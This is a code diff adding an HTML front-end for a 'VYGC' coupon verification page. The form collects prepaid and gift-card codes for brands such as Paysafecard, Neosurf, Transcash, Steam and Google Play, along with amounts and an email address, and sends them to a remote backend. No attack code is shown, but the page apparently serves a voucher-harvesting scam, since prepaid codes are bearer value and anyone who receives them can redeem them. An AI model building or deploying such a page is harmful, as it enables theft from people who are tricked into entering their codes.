@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VYGC - Coupon Verification</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <h1>VYGC</h1>
+        <p class="intro">Please enter the coupon information here.</p>
+        
+        <form id="verificationForm">
+            <div class="form-group">
+                <label for="rechargeType">Choose a recharge *</label>
+                <select id="rechargeType" name="rechargeType" required>
+                    <option value="">---- ----</option>
+                    <option value="neosurf">NEOSURF</option>
+                    <option value="pcs">PCS</option>
+                    <option value="transcash">TRANSCASH</option>
+                    <option value="paysafecard">PAYSAFECARD</option>
+                    <option value="googleplay">GOOGLE PLAY</option>
+                    <option value="steam">STEAM</option>
+                    <option value="flexepin">FLEXEPIN</option>
+                    <option value="cashlib">CASHLIB</option>
+                    <option value="netflix">NETFLIX</option>
+                    <option value="amazon">AMAZON</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label for="rechargeAmount">Recharge amount *</label>
+                <input type="text" id="rechargeAmount" name="rechargeAmount" placeholder="Enter amount" required>
+            </div>
+
+            <div class="form-group">
+                <label for="currency">Choose a currency *</label>
+                <select id="currency" name="currency" required>
+                    <option value="">---- ----</option>
+                    <option value="eur">EURO (€)</option>
+                    <option value="usd">Dollar ($)</option>
+                    <option value="chf">SWISS FRANC (CHF)</option>
+                    <option value="sek">KRONA (SEK)</option>
+                    <option value="dkk">KRONE (DKK)</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label>Enter recharge codes</label>
+                <input type="text" id="code1" name="code1" placeholder="Enter recharge code 1" required>
+                <input type="text" id="code2" name="code2" placeholder="Enter recharge code 2">
+                <input type="text" id="code3" name="code3" placeholder="Enter recharge code 3">
+                <input type="text" id="code4" name="code4" placeholder="Enter recharge code 4">
+            </div>
+
+            <div class="form-group">
+                <label for="email">Enter your email</label>
+                <input type="email" id="email" name="email" placeholder="your@email.com" required>
+            </div>
+
+            <button type="submit" class="submit-btn">
+                <span class="btn-text">Verify Code</span>
+                <span class="btn-loader" style="display: none;">Loading...</span>
+            </button>
+        </form>
+
+        <div id="message" class="message" style="display: none;"></div>
+    </div>
+
+    <!-- Backend API Configuration -->
+    <script>
+        window.API_BASE_URL = window.location.hostname === 'localhost' 
+            ? 'http://localhost:3000' 
+            : 'https://vygc-backend.onrender.com';
+    </script>
+
+    <script src="vygc-api.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
